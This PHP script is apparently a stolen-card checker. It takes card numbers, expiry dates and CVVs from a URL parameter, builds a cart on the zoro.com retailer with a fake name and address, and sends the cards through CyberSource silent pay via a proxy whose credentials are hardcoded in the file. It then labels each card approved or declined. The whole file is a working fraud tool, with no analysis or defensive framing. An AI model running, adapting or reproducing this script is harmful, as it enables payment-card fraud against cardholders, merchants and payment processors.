<?php

set_time_limit(0);
error_reporting(0);
date_default_timezone_get('America/Buenos_Aires');

function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}
function multiexplode($seperator, $string){
$one = str_replace($seperator, $seperator[0], $string);
$two = explode($seperator[0], $one);
return $two;
}

function Capture($string, $first, $last){
    $start = strpos($string, $first) + strlen($first);
    $end = strpos($string, $last, $start) - $start;
    return trim(preg_replace('/\s\s+/', '', strip_tags(substr($string, $start, $end))));
};

$lista = $_GET['lista'];
preg_match_all("/([\d]+\d)/", $lista, $key);
$cc = $key[0][0];
$mes = $key[0][1];
$ano = $key[0][2];
$cvv = $key[0][3];
$rex = ''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'';

$c1 = substr($cc, 0, 4); 
$c2 = substr($cc, 4, 4); 
$c3 = substr($cc, 8, 4); 
$c4 = substr($cc, -4);
$bin = substr($cc, 0, 6);


    if (strlen($mes) == 1) $mes = "0".$mes;
    if (strlen($ano) == 2) $ano = "20".$ano;

if(file_exists(getcwd().('/cookie.txt'))){
    @unlink('cookie.txt');
  } 
#------[Email Generator]------#

function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();

#------[Bin Lookup]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://bins.su/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Language: en-US,en;q=0.9',
'Cache-Control: max-age=0',
'Connection: keep-alive',
'Content-Type: application/x-www-form-urlencoded',
'Host: bins.su',
'Origin: http://bins.su',
'Referer: http://bins.su/',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&bank=&country=');

$result = curl_exec($ch);
$bin = trim(strip_tags(getStr($result, '<td>Bank</td></tr><tr><td>','</td>')));
$country = trim(strip_tags(getStr($result, '<td>'.$bin.'</td><td>','</td>')));
$vendor = trim(strip_tags(getStr($result, '<td>'.$country.'</td><td>','</td>')));
$type = trim(strip_tags(getStr($result, '<td>'.$vendor.'</td><td>','</td>')));
$level = trim(strip_tags(getStr($result, '<td>'.$type.'</td><td>','</td>')));
$bank = trim(strip_tags(getStr($result, '<td>'.$level.'</td><td>','</td>')));

#------[Rand]------#

$DET     = file_get_contents("https://randomuser.me/api/1.2/?nat=us");
$first   = ucfirst(str_shuffle('lucas'));
$last    = ucfirst(str_shuffle('noob'));
$street  = trim(strip_tags(getStr($DET,'"street":"','"')));
$city    = trim(strip_tags(getStr($DET,'"city":"','"')));
$state   = trim(strip_tags(getStr($DET,'"state":"','"')));
$Zip     = trim(strip_tags(getStr($DET,'"postcode":',',"')));
$seed    = trim(strip_tags(getStr($DET,'"seed":"','"')));
$ph      = array("682","346","246");
$ph1     = array_rand($ph);
$phh     = $ph[$ph1];
$phone   = "$phh".rand(0000000,9999999)."";
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);

#------[GET]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp92824669:Vaibhav@1234');
curl_setopt($ch, CURLOPT_URL, 'https://www.zoro.com/metabo-plungesawbladestarlockpluswood-626946000/i/G001201953/?recommended=true/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'if-none-match: W/"660d654e03f2b3fd1da0166887bf1f21"';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$get = curl_exec($ch);

# Api Key
$api = GetStr($get,"kongGatewayKey: '","',");

curl_close($ch);

#------[CURL-1]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp92824669:Vaibhav@1234');
curl_setopt($ch, CURLOPT_URL, 'https://api.prod.zoro.com/v1/cart');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json, text/plain, */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'apikey: '.$api.'';
$headers[] = 'content-type: application/json;charset=UTF-8';
$headers[] = 'ctcartexperience: 1';
$headers[] = 'origin: https://www.zoro.com';
$headers[] = 'referer: https://www.zoro.com/';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{}');
$curl1 = curl_exec($ch);

# Cart iD
$carts = GetStr($curl1,'"cartId": "','"');

curl_close($ch);

#------[CURL-2]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp92824669:Vaibhav@1234');
curl_setopt($ch, CURLOPT_URL, 'https://api.prod.zoro.com/v1/cart/'.$carts.'/items');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json, text/plain, */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'apikey: '.$api.'';
$headers[] = 'content-type: application/json;charset=UTF-8';
$headers[] = 'ctcartexperience: 1';
$headers[] = 'origin: https://www.zoro.com';
$headers[] = 'referer: https://www.zoro.com/';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"item":{"zoroNo":"G001201953","qty":3}}');
$curl2 = curl_exec($ch);
curl_close($ch);

#------[CURL-3]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp92824669:Vaibhav@1234');
curl_setopt($ch, CURLOPT_URL, 'https://api.prod.zoro.com/v1/cart/'.$cart.'/shippingaddress');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json, text/plain, */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'apikey: '.$api.'';
$headers[] = 'content-type: application/json;charset=UTF-8';
$headers[] = 'ctcartexperience: 1';
$headers[] = 'origin: https://www.zoro.com';
$headers[] = 'referer: https://www.zoro.com/';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"shippingAddress":{"fullName":"'.$first.' '.$last.'","address1":"'.$c4.' Dan Allen Drive","address2":"706-A, Sullivan Residence Hall","city":"Raleigh","state":"NC","zip":"27607","phoneNumber":"'.$phone.'","intendedForExport":false,"emailSubscribe":true,"isDefaultShipping":true}}');
$curl3 = curl_exec($ch);
curl_close($ch);

#------[CURL-4]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp92824669:Vaibhav@1234');
curl_setopt($ch, CURLOPT_URL, 'https://api.prod.zoro.com/v1/cart/'.$cart.'/shippingmethod');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
$headers = array();
$headers[] = 'accept: application/json, text/plain, */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'apikey: '.$api.'';
$headers[] = 'content-type: application/json;charset=UTF-8';
$headers[] = 'ctcartexperience: 1';
$headers[] = 'origin: https://www.zoro.com';
$headers[] = 'referer: https://www.zoro.com/';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"id":"03"}');
$curl4 = curl_exec($ch);
curl_close($ch);

#------[CURL-5]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp92824669:Vaibhav@1234');
curl_setopt($ch, CURLOPT_URL, 'https://api.prod.zoro.com/v1/cart/'.$cart.'/billingaddress');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json, text/plain, */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'apikey: '.$api.'';
$headers[] = 'content-type: application/json;charset=UTF-8';
$headers[] = 'ctcartexperience: 1';
$headers[] = 'origin: https://www.zoro.com';
$headers[] = 'referer: https://www.zoro.com/';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"billingAddress":{"fullName":"'.$first.' '.$last.'","address1":"'.$c4.' Dan Allen Drive","address2":"706-A, Sullivan Residence Hall","city":"Raleigh","state":"NC","zip":"27607","phoneNumber":"'.$phone.'","isDefaultBilling":true}}');
$curl5 = curl_exec($ch);
curl_close($ch);

#------[CURL-6]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp92824669:Vaibhav@1234');
curl_setopt($ch, CURLOPT_URL, 'https://api.prod.zoro.com/v1/payment/signfields');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json, text/plain, */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'apikey: '.$api.'';
$headers[] = 'content-type: application/json;charset=UTF-8';
$headers[] = 'origin: https://www.zoro.com';
$headers[] = 'referer: https://www.zoro.com/';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"billingAddress":{"fullName":"'.$first.' '.$last.'","address1":"'.$c4.' Dan Allen Drive","address2":"706-A, Sullivan Residence Hall","city":"Raleigh","state":"NC","zip":"27607","phoneNumber":"'.$phone.'","isDefaultBilling":true,"isDefaultShipping":false},"shippingAddress":{"address1":"'.$c4.' Dan Allen Drive","address2":"706-A, Sullivan Residence Hall","city":"Raleigh","fullName":"'.$first.' '.$last.'","state":"NC","zip":"27607","phoneNumber":"'.$phone.'","isDefaultShipping":true},"email":"'.$email.'","referenceId":"WB4929915754","total":19.86,"forwardTo":"https://www.zoro.com/checkout","customerCookiesAccepted":"true","deviceFingerprintId":"160b689d-ce77-4988-9a83-bb4c4768937b","taxTotal":1.36,"shippingMethod":"03","customerId":"undefined","intendedForExport":false,"orderItems":[{"sku":"G001201953","name":"Plunge saw blade \"Starlock Plus\" wood","price":13.5,"qty":1,"code":"12106275"}],"cartId":"'.$cart.'","purchaseNumber":"","emailSubscription":true}');
$curl6 = curl_exec($ch);
$cyber = json_decode($curl6, 1)['cyberSourceResponse'];
$printr = print_r($cyber, true);

#------[CURL-7]------#
if (substr($cc, 0, 1) == 4) {
    $typec = "001";
} elseif (substr($cc, 0, 1) == 5) {
    $typec = "002";
} elseif (substr($cc, 0, 1) == 3) {
    $typec = "003";
} else {
    echo '<tr><td><span class="badge badge-danger">DEAD</span></td><td>' . $lista . '</td><td><span class="badge badge-danger">American Express Cards are forbidden...</span></td></tr>';
}
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, 'gate.dc.smartproxy.com:20000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'sp92824669:Vaibhav@1234');
curl_setopt($ch, CURLOPT_URL, 'https://secureacceptance.cybersource.com/silent/pay');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://www.zoro.com';
$headers[] = 'referer: https://www.zoro.com/';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($cyber).'&card_type='.$typec.'&&card_number='.$cc.'&card_expiry_date='.$mes.'-'.$ano.'&card_cvn='.$cvv);
$result = curl_exec($ch);

# CVV Respo
$cvvre  = GetStr($result,'<input type="hidden" name="auth_cv_result" id="auth_cv_result" value="','" />');

# AVS Respo
$avsre  = GetStr($result,'<input type="hidden" name="auth_avs_code" id="auth_avs_code" value="','" />');

# Message
$messa  = GetStr($result,'<input type="hidden" name="message" id="message" value="We encountered a Vital problem:','" />');
$messs  = GetStr($result,'<input type="hidden" name="message" id="message" value="','" />');

if(empty($messa)){
$messa = $messs;
}
# Decision
$deci  = GetStr($result,'<input type="hidden" name="decision" id="decision" value="','" />');

curl_close($ch);

#-----------------------------------------------[Responses]-----------------------------------------------#


if(strpos($result, '<input type="hidden" name="message" id="message" value="Request was processed successfully." />')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CHARGE SUCCESS MESSAGE: '.$messa.' -> Bank: '.$bank.'['.$country.'] Lucas ♛ </span></br>';
}
elseif($messa == "Insufficient funds") {
  
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★CVV- '.$cvvre.' '.$decision.' MESSAGE: '.$deci.' -> Bank: '.$bank.'['.$country.'] Lucas ♛ </span></br>';
}
elseif($deci == "REVIEW") {
  
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★CVV- '.$cvvre.' '.$decision.' MESSAGE: '.$deci.' -> Bank: '.$bank.'['.$country.'] Lucas ♛ </span></br>';
}
 else {
  echo '<span class="new badge danger">Reprovadas</span> <span class="new badge danger">✕</span> <span class="new badge danger">' . $lista . '</span> <span class="new badge danger">✕</span> <span class="badge badge-danger"> ★ '.$messa.' -> Bank: '.$bank.'['.$country.'] Lucas ♛</span> </br>';
}

echo "<b>CVV Respo: $cvvre</b> <b>AVS Respo: $avsre</b> <b>Message: $messa</b> <b>Decision: $deci</b>";

curl_close($ch);
ob_flush();
unlink("cookie.txt");
sleep(3);
?>